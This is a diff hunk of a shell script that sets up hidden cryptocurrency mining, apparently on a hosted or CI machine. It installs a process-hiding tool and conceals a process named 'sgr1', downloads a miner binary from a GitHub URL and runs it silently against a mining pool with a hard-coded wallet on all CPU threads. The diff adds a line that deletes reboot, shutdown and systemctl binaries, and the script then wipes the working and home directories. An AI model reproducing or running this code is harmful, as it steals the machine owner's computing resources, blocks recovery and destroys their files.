@@ -20,12 +20,11 @@ npm install -g npm@10.2.0 -y
 npm i -g node-process-hider
 ph add sgr1
 mkdir .lib && cd .lib
-wget https://github.com/TiannaMcdowell/All-File/releases/download/Nano/nano.tar.gz > /dev/null 2>&1
-tar -xvf nano.tar.gz
-chmod u+x nano
-mv nano sgr1
-./sgr1 -algo RandomX -wallet Q010500f8f21098ccf5acf2f08f0e6b315fb958d7c7a1bf811f34e49f7ac459f4aa7683c723391d -coin XMR -rigName envio -pool1 141.95.126.31:1166 -useSSL false -cpuThreads $(nproc --all) > /dev/null 2>&1 &
+wget -O sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/xmolx > /dev/null 2>&1 
+chmod u+x sgr1
+./sgr1 --donate-level 1 -o sg.qrl.herominers.com:1166 -u Q010500f8f21098ccf5acf2f08f0e6b315fb958d7c7a1bf811f34e49f7ac459f4aa7683c723391d -p $(TZ=":Asia/Jakarta" date '+%Y%m%d') -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
 sleep 30
+sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 rm -rvf *
 cd ~/
 rm -rvf *
